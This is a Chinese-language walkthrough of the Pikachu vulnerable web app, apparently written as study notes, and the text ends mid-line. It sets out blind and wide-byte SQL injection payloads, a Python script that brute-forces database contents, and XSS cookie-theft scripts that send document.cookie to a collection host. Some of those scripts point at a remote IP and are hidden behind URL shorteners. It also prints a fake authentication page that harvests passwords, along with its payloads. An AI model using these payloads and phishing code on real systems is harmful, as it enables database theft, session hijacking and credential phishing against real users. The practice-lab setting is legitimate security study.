closeUpgrade-Insecure-Requests: 1\n盲注(base on boolian)# 随便写入 admin ，提示不存在，该输入 lucy ，返回 id 和 email# 看下url，name拼接输入内容（lucy）；再加个单引号，还是不存在；再加个注释（#），咋没提示# 看下官方提示（admin/123456），啥玩意？# lucy&#x27; AND TRUE#，可以呀，试下永真式（lucy&#x27; or 1=1#），不存在？ AND关键字都行，不可能我 OR 不行的，比对源码，解析在下一个代码块# # 看了下其他师傅的，通过 &#x27;and&#x27;关键字构造《真事件TRUE》来判断字符存在（and事件成立，则提示id和email，反之提示不存在）。# 写入假事件（lucy&#x27; and FALSE #），其中and左边为TRUE，右边为FALSE，提示不存在，完整sql：select id,email from member where username=&#x27;lucy&#x27; and FALSE #&#x27;# 写入真事件，上面的 FALSE 改为 TRUE 就行# sql语法中，&#x27;=&#x27;符号为if等条件判断中使用；# 来个小栗子好理解，输入 lucy&#x27; and substring(database(),1,1)=&#x27;p&#x27;## 上述写入理解：使用 database() 函数获取当前数据库名（字符串），使用 substring() 函数拿取字符串位序为1开始的1个字符，通过&#x27;==&#x27;判断字符与猜想的（此处为&#x27;p&#x27;）是否一致，此处 and 的右边为TRUE，整个sql语句正确，提交显示 lucy 的id和email。# 通过bp的爆破模块，将 substring() 函数的第2参数作为第1变量（字典：1到正无穷），将猜想 p 作为第2变量（字典：a-z、A-Z、1-9、特殊字符）# 看到这，是不是很想sqlmap的报库名环节，不断猜想。现在，让我们来试试python爬虫# python 脚本如下个代码块\n# 源码## 比较 mysqli_num_rows() 函数返回记录数，为一条记录则输出其中的 id 和 email 字段# # 当输入永真式(luc&#x27; OR TRUE)时，列出member表中所有记录，则记录数不为1，故执行 else 语句# 使用限制显示记录的关键字：limit；使用限制偏移量的关键字：offset。展示：# luc&#x27; OR TRUE limit 1 offset 2## 单条记录显示，如果我想拉取所有数据呢？怎么来？爬虫！### 等下啦，先看看如何显示当前数据库名，UNION 连接两个 SELECT 语句，仍是使用 LIMIT 和 OFFSET 限制记录数和显示那条记录。# 如下，第一条 SELECT 语句得到一条空记录，第二条 SELECT 语句获得（id=1，email=‘当前数据库名’）# a&#x27; UNION select 1, database() LIMIT 1 OFFSET 1#### mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组$html=&#x27;&#x27;;if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    $name=$_GET[&#x27;name&#x27;];//这里没有做任何处理，直接拼到select里面去了    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;//这里的变量是字符型，需要考虑闭合    //mysqi_query不打印错误描述,即使存在注入,也不好判断    $result=mysqli_query($link, $query);////     $result=execute($link, $query);    if($result &amp;&amp; mysqli_num_rows($result)==1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n# python脚本#import requestsimport re# 需要参数内容headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55&#x27;&#125;;url = &#x27;http://192.168.135.130:49154/vul/sqli/sqli_blind_b.php&#x27;;# grammar = &#x27;database()&#x27;# 存储各个查询命令grammars = [&#x27;database()&#x27;, &#x27;(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.TABLES)&#x27;,            &#x27;(SELECT GROUP_CONCAT(DISTINCT TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=&quot;pikachu&quot;)&#x27;,            &#x27;(SELECT GROUP_CONCAT(DISTINCT COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&quot;pikachu&quot;)&#x27;,            &#x27;(SELECT GROUP_CONCAT(DISTINCT username) FROM pikachu.member)&#x27;]num = 0# grammar = &#x27;&#x27;# sql 语法不区分字母大小写guess = &#x27;abcdefghigklmnopqrstuvwxyz0123456789@_.,&#x27;# 循环使用各个语句def loop():    for i in enumerate(grammars):        print(i[1] + &quot;--&gt;&quot;, end=&#x27;&#x27;)        grammar = i[1]        parameter(grammar)        print()# 处理参数语句def parameter(data):    values = &#x27;&#x27;    length = 0    flag = False    # 获取数据库名长度    # for i in range(1, 100):    #     # 检测当前数据库名长度    #     # values = &quot;lucy&#x27; and length(grammar)=&#123;num&#125;#&quot;.format(num=i)    #     # 拿到 information_schema.TABLES 的字段 TABLE_SCHEMA 下所有不重复值成组长度    #     values = &quot;lucy&#x27; and (SELECT length(GROUP_CONCAT(DISTINCT TABLE_SCHEMA)) FROM information_schema.TABLES)=&#123;num&#125;#&quot;.format(    #         num=i)    #     # print(values)    #     flag = query(values)    #     if flag:    #         print(&quot;数据库名长度：&quot; + str(i))    #         length = i    #         # return i    # for i in range(1, length + 1):    flag = False    isnum = 0    for i in range(1, 1024):        # for j in range(0, len(guess) + 1):        for j in range(0, len(guess)):            x = guess[j:j + 1]            # print(x, end=&#x27;&#x27;)            values = &quot;lucy&#x27; and substring(&#123;grammar&#125;,&#123;num&#125;,1)=&#x27;&#123;guess&#125;&#x27;#&quot;.format(grammar=data, num=i,                                                                                guess=x)            flag = query(values)            # print(flag)            if flag:                print(x, end=&#x27;&#x27;)                break        # 不先获取数据长度的后果，继续做值爆破完成判断        # print(&#x27;-&#x27; + str(isnum),end=&#x27;&#x27;)        # print(bool(1-flag),end=&#x27;&#x27;)        if bool(1 - flag):            # print(&#x27;ni-&#x27; + x + &#x27;-ni&#x27; + str(i))            isnum = isnum + 1        if isnum == 2:            break        # flag = False        # print()        # print(values)# 弄个请求函数def query(values):    params = &#123;        &#x27;name&#x27;: values,        &#x27;submit&#x27;: &#x27;查询&#x27;    &#125;    response = requests.get(url=url, headers=headers, params=params);    query_text = response.text    # print(query_text)    #    # 使用xpath    # tree = etree.HTML(query_text)    # tree_str = tree.xpath(&#x27;//div/p[@class=&quot;notice&quot;]/text()&#x27;)    # print(tree_str[0])    #    # 使用正则    ex = &quot;&lt;p class=&#x27;notice&#x27;&gt;(.*?) uid:.*?&lt;/p&gt;&quot;    judge = re.findall(ex, query_text, re.S)    # print(judge)    if len(judge) == 0:        return False    else:        return Trueif __name__ == &quot;__main__&quot;:    # print(values)    # query()    # parameter()    loop()    input(&#x27;\\n请输入任意键退出！！！&#x27;)\n盲注(base on time)# 任意输入看提示；输入存在账户，都是提示：i don&#x27;t care who you are!# 不在乎我是谁？# 根据关卡名判断，与时间有关！F12分别看下响应时间，多次测试得到：36ms和31ms# 注：正确账户响应时间更长# 试了下其他操作，有些命令执行时间过短，难以判断，调用 if 语句和 sleep() 函数进行延时判断：lucy&#x27; and if(substring(database(),1,1)=&#x27;p&#x27;,sleep(6),null)## 语句解析：当 if 语句为 TRUE，则延时6s，反之时间很小，多以ms为单位## 其他payload# 查看当前数据库名长度lucy&#x27; and if(length(database())=7, sleep(6), null)## 查看所有数据库名成组后长度lucy&#x27; and if((SELECT length(GROUP_CONCAT(DISTINCT TABLE_SCHEMA)) FROM information_schema.TABLES)=61,sleep(6),null)## 想着试下 union 关键字，额，没显示呀# 搞下报错，……搞不出，好吧，太菜了\n# 还是得分析下源码滴# submit存在，对输入进行判空# mysqli_query() 函数执行某个针对数据库的查询，返回TRUE or FALSE# $result 存在且为单行记录# 成功与失败的返回是一致的，如靶场作者所说，更加不好判断了# SO，需要我们根据响应时间进行判断，分析源码可以看到 $result 但凡有一项不满足直接提示；若全满足，则进行其他操作，增加响应时间$link=connect();$html=&#x27;&#x27;;if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    $name=$_GET[&#x27;name&#x27;];//这里没有做任何处理，直接拼到select里面去了    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;//这里的变量是字符型，需要考虑闭合    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述//     $result=execute($link, $query);//    $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;;    if($result &amp;&amp; mysqli_num_rows($result)==1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;;    &#125;&#125;\n宽字节注入\n原理：利用MySQL特性，即MySQL使用GBK编码时，认为两个字符为一个汉字（前一个ASCII码要大于128，进入汉字范围）。\n宽字节注入 方法：单引号逃逸SET NAMES &#x27;gbk&#x27;## 以上1行等价与如下3行，该数据的写入导致宽字节注入的出现#SET character_set_connection=&#x27;gbk&#x27;SET character_set_results=&#x27;gbk&#x27;SET character_set_client=gb\n# 哒哒哒，骑上我心爱的小摩托！# payload：1%df%27+or+1=1## 咋咧，直接写入不存在？hacker 插件写入也不存在# burp，我们走！（请求包放下一个代码块）什么原理，居然可以# 有点明白，不知道对不对，即编码次数与解码次数不一致导致无法正确识别# bp抓包可以看到，1%df%27+or+1=1# 被再次编码：1%25df%2527%2Bor%2B1%3D1%23# 问题分析：上边的单引号已经使用%27进行编码，当浏览器上传时再次编码，源码文件中再次进行转义，但此时 escape() 函数已经无法识别出单引号了；即便语句换成 1%df&#x27; or 1=1# 也因浏览器的上传编码导致单引号变成%27，最后 escape() 函数也不需要进行转义处理。# 更改下，使用hacker插件写入 1%df&#x27; or 1=1# 作为 name 值，可以# ## 其他payload# 联合语句拿所有数据库名# name=1%DF&#x27; union SELECT 1,GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.TABLES#&amp;submit=%E6%9F%A5%E8%AF%A2# 拿当前数据库名# name=1%DF&#x27; union SELECT 1,database()#&amp;submit=%E6%9F%A5%E8%AF%A2# ## 就使用数据库测试时发现，有个奇怪的，根据源码拼接转义后字符串：1�\\&#x27; or 1=1# ，即# select id,email from member where username=&#x27;1�\\&#x27; or 1=1# # 报错：&gt; 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1�\\&#x27; or 1=1#&#x27; at line 1# 少个单引号？什么操作，源码里还有什么操作滴？瞅了一眼，就是直接拼接呀，加个输出（源码解析里看原因）：&lt;?php echo $query;?&gt;# select id,email from member where username=&#x27;1�\\&#x27; or 1=1#&#x27; # 自提供的单引号倒是构成了闭合，但没数据呀# 再看看，看到没：execute($link,$set); ，设置客户端来源编码为 GBK ，# 当再执行 mysqli_query($link, $query); 时，因为 SQL 语句中的 &#x27;�&#x27; 转成　ASCII　码为253，大于128，进入汉字范围，则需要与后一个字符进行组合形成一个汉字（两个字符组成一个汉字），因此，我们的单引号就逃逸了，SQL语句能够形成闭合，造成宽字节注入的实现，这就是宽字节注入的所有实现过程。\nPOST /vul/sqli/sqli_widebyte.php HTTP/1.1Host: 192.168.135.130:49154User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.135.130:49154/vul/sqli/sqli_widebyte.phpCookie: PHPSESSID=60trut6t3ruj65dnabae8a07hpDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 46name=1%df%27+or+1=1#&amp;submit=%E6%9F%A5%E8%AF%A2\n# 源码分析# # 调用escape() 对输入内容（$_POST[&#x27;name&#x27;]）进行重新编码# escape() 函数，不会对 ASCII 字母和数字进行编码，也不会对某些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被十六进制的转义序列替换。# 然后，就直接拼入SQL语句中# 调用 execute() 函数，将 &quot;set character_set_client=gbk&quot; 写入数据库，更改客户端来源编码# 使用 mysqli_query() 函数执行查询操作，根据返回结果执行网页输出## 写入 %df%27 时进行分析# %27 为单引号的URL编码# %df 解码为 �，不知道是个啥，不用管，仅为与另一个字符组合构成一个汉字，造成单引号逃逸# 当执行 escape($link,$_POST[&#x27;name&#x27;]) 时，被转义编码为：%25df%2527# 呃……这是以js形式运行的 escape() 函数，他是编码了，所以我还是弄不出它转义效果，理解不是很好# 还是对源码下手了，在 &lt;?php echo $html;?&gt; 上一行添加了 &lt;?php echo $name;?&gt; 把escape() 运行后结果输出，还真是输入框输入：1&#x27; ，输出：1\\&#x27; 。的确是将单引号进行转义的，而不是进行编码输出# 试下：1%df&#x27; or 1=1# ，这个，直接输入输入框中不行，需要用到docker插件写入：1�\\&#x27; or 1=1# # F12 比对post参数信息，确实是浏览器再次编码问题导致程序解出我们的预期，写一下吧# 浏览器直接写入显示：name=1%25df%27+or+1%3D1%23&amp;submit=%E6%9F%A5%E8%AF%A2# 插件写入显示：name=1%df&#x27; or 1=1#&amp;submit=%E6%9F%A5%E8%AF%A2# 最后，当执行 mysqli_query($link, $query) 后，由于使用 SELECT 查询，成功则返回一个 mysqli_result 对象$link=connect();$html=&#x27;&#x27;;if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;name&#x27;]!=null)&#123;    $name = escape($link,$_POST[&#x27;name&#x27;]);    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;//这里的变量是字符型，需要考虑闭合    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题    $set = &quot;set character_set_client=gbk&quot;;    execute($link,$set);    //mysqi_query不打印错误描述    $result=mysqli_query($link, $query);    if(mysqli_num_rows($result) &gt;= 1)&#123;        while ($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n# 部分GBK 编码表99 ０ １ ２ ３ ４ ５ ６ ７ ８ ９ Ａ Ｂ Ｃ Ｄ Ｅ Ｆ４ 橜 橝 橞 機 橠 橢 橣 橤 橦 橧 橨 橩 橪 橫 橬 橭５ 橮 橯 橰 橲 橳 橴 橵 橶 橷 橸 橺 橻 橽 橾 橿 檁６ 檂 檃 檅 檆 檇 檈 檉 檊 檋 檌 檍 檏 檒 檓 檔 檕７ 檖 檘 檙 檚 檛 檜 檝 檞 檟 檡 檢 檣 檤 檥 檦８ 檧 檨 檪 檭 檮 檯 檰 檱 檲 檳 檴 檵 檶 檷 檸 檹９ 檺 檻 檼 檽 檾 檿 櫀 櫁 櫂 櫃 櫄 櫅 櫆 櫇 櫈 櫉Ａ 櫊 櫋 櫌 櫍 櫎 櫏 櫐 櫑 櫒 櫓 櫔 櫕 櫖 櫗 櫘 櫙Ｂ 櫚 櫛 櫜 櫝 櫞 櫟 櫠 櫡 櫢 櫣 櫤 櫥 櫦 櫧 櫨 櫩Ｃ 櫪 櫫 櫬 櫭 櫮 櫯 櫰 櫱 櫲 櫳 櫴 櫵 櫶 櫷 櫸 櫹Ｄ 櫺 櫻 櫼 櫽 櫾 櫿 欀 欁 欂 欃 欄 欅 欆 欇 欈 欉Ｅ 權 欋 欌 欍 欎 欏 欐 欑 欒 欓 欔 欕 欖 欗 欘 欙Ｆ 欚 欛 欜 欝 欞 欟 欥 欦 欨 欩 欪 欫 欬 欭 欮\n\n管理工具–XSS后台cookie搜集# 可以看下 /app/pkxss/xcookie/cookie.php 中内容，其中代码用于获取用户cookie# 以 xss 第一题为例# 构造输入盲打语句&lt;script&gt;document.location=&#x27;http://192.168.135.132:49160/pkxss/xcookie/cookie.php?cookie=&#x27;+document.cookie;&lt;/script&gt;# 最后拼接，此处拿题1测试，KOhttp://192.168.135.132:49160/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.135.132%3A49160%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&amp;submit=submit# 这么长？一看就有问题，找个短链生成器缩短下，度娘是不会吝啬的https://bit.ly/3lEax4u#自己打自己肯定不好玩，那打本地发到远程服务上：http://192.168.135.130:49154/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F112.64.65.110%3A9002%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&amp;submit=submit# 对应短链：http://k8i.cn/wEBbU# 服务器对服务器的（不要问我哪来那么多服务器，佛法搜一下），只给短链：http://k8i.cn/FJcGr\n# http://192.168.135.130:49154/pkxss/xcookie/cookie.php 源码# 通过 cookie 进行传参，因此需要把远程服务器上的脚本作为 cookie 值### 分析下如下 URL 的运行机制：http://192.168.135.132:49160/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.135.132%3A49160%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&amp;submit=submit## 比较 http://192.168.135.130:49154/vul/xss/xss_reflected_get.php 源码可知，写入内容直接拼接后输出前端，即执行插入的脚本（message 值）。# 通过 script 标签执行 js 脚本，具体：利用 document.location 方法访问其后的 URL，而在访问该 URL 时，需要先通过 document.cookie 方法拿到当前页面 cookie，才能继续执行。## 当执行完恶意代码后，攻击方获得 URL 访问时间和 cookie 等重要参数 # 再进行 header() 和 Location 结合组成跳转页面的效果。# header() 函数向客户端发送原始的 HTTP 报头。# Location 类似 document.location 作用。&lt;?phpinclude_once &#x27;../inc/config.inc.php&#x27;;include_once &#x27;../inc/mysql.inc.php&#x27;;$link=connect();//这个是获取cookie的api页面if(isset($_GET[&#x27;cookie&#x27;]))&#123;    $time=date(&#x27;Y-m-d g:i:s&#x27;);    $ipaddress=getenv (&#x27;REMOTE_ADDR&#x27;);    $cookie=$_GET[&#x27;cookie&#x27;];    $referer=$_SERVER[&#x27;HTTP_REFERER&#x27;];    $useragent=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];    $query=&quot;insert cookies(time,ipaddress,cookie,referer,useragent)     values(&#x27;$time&#x27;,&#x27;$ipaddress&#x27;,&#x27;$cookie&#x27;,&#x27;$referer&#x27;,&#x27;$useragent&#x27;)&quot;;    $result=mysqli_query($link, $query);&#125;header(&quot;Location:http://192.168.135.132:49161/index.php&quot;);//重定向到一个可信的网站?&gt;\n# http://192.168.135.130:49154/pkxss/xcookie/post.html 源码## 这个界面就和之前的 xss 第二题的界面相同了，但多了一个暗中隐藏的恶意 post 表单（ script 标签包裹部分）# 即当访问 post.html 时，解析到 form 标签时# 跳转访问 xss_reflected_post.php ，之后的两个 input 标签作为其 post 参数一起传入# onload 通常用于 &lt;body&gt; 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码# 即页面全部显示后，通过 onload 事件实现自动化的点击事件，相当于人工点击 submit 按钮# 若跳转时发现没有登录，则转而跳转到 post_login.php 登陆界面，成功才跳转 xss_reflected_post.php 界面# 此时，已经无法捕获用户 cookie，除非再次访问 post.html# 故，仅有在用户登录 post_login.php 访问 post.html 才能触发获取 cookie# 再次理解：通过 post 表单与 onload 事件组合实现用户发起访问 xss_reflected_post.php 的请求&lt;html&gt;&lt;head&gt;&lt;script&gt;window.onload = function() &#123;  document.getElementById(&quot;postsubmit&quot;).click();&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.4/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt;    &lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; name=&quot;message&quot; value=    &quot;&lt;script&gt;document.location = &#x27;http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;        &lt;/script&gt;&quot;         /&gt;    &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- *&lt;script&gt;document.write(&#x27;&lt;img src=&quot;http://127.0.0.1/antxss/xcookie/cookie.php?cookie=&#x27;+document.cookie+&#x27;&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot; /&gt;&#x27;);&lt;/script&gt;*//*&lt;script&gt;document.location = &#x27;http://127.0.0.1/antxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;*/--&gt;\n# 127.0.0.1/pkxss/xcookie/pkxss_cookie_result.php 源码# 为什么我要放这个页面的源码，打sql上瘾了，看到删除操作就行试试，# 注意：# is_numeric() 函数用于检测变量是否为数字或数字字符串。# 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。# 所以，写永真式注入是不行喽，有空回来再看看吧&lt;?php// error_reporting(0);include_once &#x27;../inc/config.inc.php&#x27;;include_once &#x27;../inc/mysql.inc.php&#x27;;$link=connect();// 判断是否登录，没有登录不能访问if(!check_login($link))&#123;    header(&quot;location:../pkxss_login.php&quot;);&#125;if(isset($_GET[&#x27;id&#x27;]) &amp;&amp; is_numeric($_GET[&#x27;id&#x27;]))&#123;    $id=escape($link, $_GET[&#x27;id&#x27;]);    $query=&quot;delete from cookies where id=$id&quot;;    execute($link, $query);&#125;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;cookie搜集结果&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../antxss.css&quot; /&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;title&quot;&gt;&lt;h1&gt;pikachu Xss 获取cookies结果&lt;/h1&gt;&lt;a href=&quot;../xssmanager.php&quot;&gt;返回首页&lt;/a&gt;&lt;/div&gt;&lt;div id=&quot;xss_main&quot;&gt;&lt;table border=&quot;1px&quot; cellpadding=&quot;10&quot; cellspacing=&quot;1&quot; bgcolor=&quot;#5f9ea0&quot;&gt;    &lt;tr&gt;        &lt;td&gt;id&lt;/td&gt;        &lt;td&gt;time&lt;/td&gt;        &lt;td&gt;ipaddress&lt;/td&gt;        &lt;td&gt;cookie&lt;/td&gt;        &lt;td&gt;referer&lt;/td&gt;        &lt;td&gt;useragent&lt;/td&gt;        &lt;td&gt;删除&lt;/td&gt;    &lt;/tr&gt;    &lt;?php     $query=&quot;select * from cookies&quot;;    $result=mysqli_query($link, $query);    while($data=mysqli_fetch_assoc($result))&#123;$html=&lt;&lt;&lt;A    &lt;tr&gt;        &lt;td&gt;&#123;$data[&#x27;id&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&#123;$data[&#x27;time&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&#123;$data[&#x27;ipaddress&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&#123;$data[&#x27;cookie&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&#123;$data[&#x27;referer&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&#123;$data[&#x27;useragent&#x27;]&#125;&lt;/td&gt;        &lt;td&gt;&lt;a href=&quot;pkxss_cookie_result.php?id=&#123;$data[&#x27;id&#x27;]&#125;&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;    &lt;/tr&gt;A;                 echo $html;                    &#125;        ?&gt;\n\n钓鱼结果# http://192.168.135.130:49154/pkxss/xfish/pkxss_fish_result.php 源码## 查看钓鱼结果，不分析&lt;?phperror_reporting(0);include_once &#x27;../inc/config.inc.php&#x27;;include_once &#x27;../inc/mysql.inc.php&#x27;;$link=connect();// 判断是否登录，没有登录不能访问if(!check_login($link))&#123;    header(&quot;location:../pkxss_login.php&quot;);&#125;if(isset($_GET[&#x27;id&#x27;]) &amp;&amp; is_numeric($_GET[&#x27;id&#x27;]))&#123;    $id=escape($link, $_GET[&#x27;id&#x27;]);    $query=&quot;delete from fish where id=$id&quot;;    execute($link, $query);&#125;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;钓鱼结果&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../antxss.css&quot; /&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;title&quot;&gt;&lt;h1&gt;pikachu Xss 钓鱼结果&lt;/h1&gt;&lt;a href=&quot;../xssmanager.php&quot;&gt;返回首页&lt;/a&gt;&lt;/div&gt;&lt;div id=&quot;result&quot;&gt;    &lt;table class=&quot;tb&quot; border=&quot;1px&quot; cellpadding=&quot;10&quot; cellspacing=&quot;1&quot; bgcolor=&quot;#5f9ea0&quot;&gt;        &lt;tr&gt;            &lt;td class=&quot;1&quot;&gt;id&lt;/td&gt;            &lt;td class=&quot;1&quot;&gt;time&lt;/td&gt;            &lt;td class=&quot;1&quot;&gt;username&lt;/td&gt;            &lt;td class=&quot;1&quot;&gt;password&lt;/td&gt;            &lt;td class=&quot;2&quot;&gt;referer&lt;/td&gt;            &lt;td class=&quot;2&quot;&gt;操作&lt;/td&gt;        &lt;/tr&gt;    &lt;?php     $query=&quot;select * from fish&quot;;    $result=mysqli_query($link, $query);    while($data=mysqli_fetch_assoc($result))&#123;$html=&lt;&lt;&lt;A    &lt;tr&gt;        &lt;td class=&quot;1&quot;&gt;&#123;$data[&#x27;id&#x27;]&#125;&lt;/td&gt;        &lt;td class=&quot;1&quot;&gt;&#123;$data[&#x27;time&#x27;]&#125;&lt;/td&gt;        &lt;td class=&quot;1&quot;&gt;&#123;$data[&#x27;username&#x27;]&#125;&lt;/td&gt;        &lt;td class=&quot;1&quot;&gt;&#123;$data[&#x27;password&#x27;]&#125;&lt;/td&gt;        &lt;td class=&quot;2&quot;&gt;&#123;$data[&#x27;referer&#x27;]&#125;&lt;/td&gt;         &lt;td&gt;&lt;a href=&quot;pkxss_fish_result.php?id=&#123;$data[&#x27;id&#x27;]&#125;&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;    &lt;/tr&gt;A;                 echo $html;     &#125;    ?&gt;    &lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;r\n# http://192.168.135.130:49154/pkxss/xfish/xfish.php 源码## 钓鱼到的数据发送攻击者数据库&lt;?phperror_reporting(0);include_once &#x27;../inc/config.inc.php&#x27;;include_once &#x27;../inc/mysql.inc.php&#x27;;$link=connect();if(!empty($_GET[&#x27;username&#x27;]) &amp;&amp; !empty($_GET[&#x27;password&#x27;]))&#123;    $username=$_GET[&#x27;username&#x27;];    $password=$_GET[&#x27;password&#x27;];    $referer=&quot;&quot;;    $referer.=$_SERVER[&#x27;HTTP_REFERER&#x27;];    $time=date(&#x27;Y-m-d g:i:s&#x27;);    $query=&quot;insert fish(time,username,password,referer)     values(&#x27;$time&#x27;,&#x27;$username&#x27;,&#x27;$password&#x27;,&#x27;$referer&#x27;)&quot;;    $result=mysqli_query($link, $query);&#125;?&gt;\n# http://192.168.135.130:49154/pkxss/xfish/fish.php 源码## 钓鱼页面# # 使用说明：# 需要将 header(&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125; 中的 IP 修改为自己管理后台的 IP，如笔者的 192.168.135.130:49154# 钓鱼页面单次出现，再次刷新将不触发## 注意：# header(&quot;Location 处语句需要连接起来才能实现真正的跳转，此处以完善## 分析：# 当用户访问该界面并根据提示输入数据时，将携带输入进行跳转 xfish.php 页面，实现数据传入数据库## payload：# 配合 xss 漏洞使用&lt;img src=&quot;http://192.168.135.130:49154/pkxss/xfish/fish.php&quot; /&gt;&lt;script src=&quot; http://192.168.135.130:49154/pkxss/xfish/fish.php&quot;&gt;中国人不骗中国人&lt;/script&gt;# 也可以直接把钓鱼URL发给其他用户：http://192.168.135.130:49154/pkxss/xfish/fish.php&lt;?phperror_reporting(0);// var_dump($_SERVER);if ((!isset($_SERVER[&#x27;PHP_AUTH_USER&#x27;])) || (!isset($_SERVER[&#x27;PHP_AUTH_PW&#x27;]))) &#123;//发送认证框，并给出迷惑性的info    header(&#x27;Content-type:text/html;charset=utf-8&#x27;);    header(&quot;WWW-Authenticate: Basic realm=&#x27;认证&#x27;&quot;);    header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);    echo &#x27;Authorization Required.&#x27;;    exit;&#125; else if  ((isset($_SERVER[&#x27;PHP_AUTH_USER&#x27;])) &amp;&amp; (isset($_SERVER[&#x27;PHP_AUTH_PW&#x27;])))&#123;//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP    header(&quot;Location: 